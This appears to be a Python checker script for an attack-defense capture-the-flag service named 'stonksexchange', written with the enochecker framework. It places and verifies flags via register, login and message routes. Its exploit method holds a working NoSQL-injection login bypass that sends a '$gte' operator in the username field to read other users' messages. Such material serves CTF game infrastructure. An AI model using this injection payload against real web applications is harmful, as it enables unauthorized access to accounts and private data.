import secrets
from typing import Optional, Tuple

import enochecker


class StonksExchangeChecker(enochecker.BaseChecker):
    port = 8199
    flag_variants = 1
    noise_variants = 2
    havoc_variants = 0
    exploit_variants = 1
    service_name = "stonksexchange"

    def putflag(self) -> Optional[str]:
        if self.variant_id > 0:
            raise enochecker.BrokenCheckerException(f"invalid variant_id in putflag: {self.variant_id}")

        sessionA = self.requests.session()  # type: ignore  # mypy complains here due to https://github.com/python/mypy/issues/5439
        sessionB = self.requests.session()  # type: ignore  # mypy complains here due to https://github.com/python/mypy/issues/5439
        self.http_session = sessionA
        self.register_user()
        self.http_session = sessionB
        (usernameB, passwordB) = self.register_user()

        self.http_session = sessionA
        assert self.flag  # ensure self.flag is not None
        self.send_message(usernameB, self.flag)

        self.chain_db = {
            "username": usernameB,
            "password": passwordB,
        }

        return None

    def getflag(self) -> None:
        if self.variant_id > 0:
            raise enochecker.BrokenCheckerException(f"invalid variant_id in putflag: {self.variant_id}")

        try:
            vals = self.chain_db
            username = vals["username"]
            password = vals["password"]
        except KeyError:
            raise enochecker.BrokenServiceException("Missing entries from putflag")

        self.login_user(username, password)
        assert self.flag  # ensure self.flag is not None
        self.receive_message(self.flag)

    def putnoise(self) -> None:
        if self.variant_id == 0:
            # send noise to different user
            sessionA = self.requests.session()  # type: ignore  # mypy complains here due to https://github.com/python/mypy/issues/5439
            sessionB = self.requests.session()  # type: ignore  # mypy complains here due to https://github.com/python/mypy/issues/5439
            self.http_session = sessionA
            self.register_user()
            self.http_session = sessionB
            (usernameB, passwordB) = self.register_user()

            self.http_session = sessionA
            self.send_message(usernameB, self.noise)

            self.chain_db = {
                "username": usernameB,
                "password": passwordB,
            }
        elif self.variant_id == 1:
            # send noise to self
            (usernameA, passwordA) = self.register_user()
            self.send_message(usernameA, self.noise)

            self.chain_db = {
                "username": usernameA,
                "password": passwordA,
            }
        else:
            raise enochecker.BrokenCheckerException(f"invalid variant_id in putnoise: {self.variant_id}")

    def getnoise(self) -> None:
        if self.variant_id == 0:
            # send noise to different user
            try:
                vals = self.chain_db
                username = vals["username"]
                password = vals["password"]
            except KeyError:
                raise enochecker.BrokenServiceException("Missing entries from putnoise")

            self.login_user(username, password)
            self.receive_message(self.noise)
        elif self.variant_id == 1:
            try:
                vals = self.chain_db
                username = vals["username"]
                password = vals["password"]
            except KeyError:
                raise enochecker.BrokenServiceException("Missing entries from putnoise")

            self.login_user(username, password)
            self.receive_message(self.noise)
        else:
            raise enochecker.BrokenCheckerException(f"invalid variant_id in getnoise: {self.variant_id}")

    def havoc(self) -> None:
        raise enochecker.BrokenCheckerException(f"invalid variant_id in havoc: {self.variant_id}")

    def exploit(self) -> str:
        if self.variant_id > 0:
            raise enochecker.BrokenCheckerException(f"invalid variant_id in exploit: {self.variant_id}")

        username = "0" * 12 + secrets.token_hex(6)
        password = secrets.token_hex(8)
        r = self.http_post(route="/register", data={"username": username, "password": password,},)
        assert r.ok
        r = self.http_post(route="/login", json={"username": {"$gte": username,}, "password": password,},)
        assert r.ok
        r = self.http_get("/messages")
        found_flag = self.search_flag(r.text)
        if found_flag:
            return found_flag
        raise enochecker.BrokenServiceException("no flag found in exploit")

    def send_message(self, username: str, message: str) -> None:
        r = self.http_post(route="/message", data={"username": username, "message": message,},)
        enochecker.utils.assert_equals(r.status_code, 302)

    def receive_message(self, message: str) -> None:
        r = self.http_get(route="/messages")
        enochecker.utils.assert_equals(r.status_code, 200)
        enochecker.utils.assert_in(message, r.text)

    def register_user(self) -> Tuple[str, str]:
        username = secrets.token_hex(6)
        password = secrets.token_hex(8)
        response = self.http_post(route="/register", data={"username": username, "password": password,},)
        enochecker.utils.assert_equals(response.status_code, 302)

        return (username, password)

    def login_user(self, username: str, password: str) -> None:
        response = self.http_post(route="/login", data={"username": username, "password": password,},)
        enochecker.utils.assert_equals(response.status_code, 302)


app = StonksExchangeChecker.service

if __name__ == "__main__":
    enochecker.run(StonksExchangeChecker)
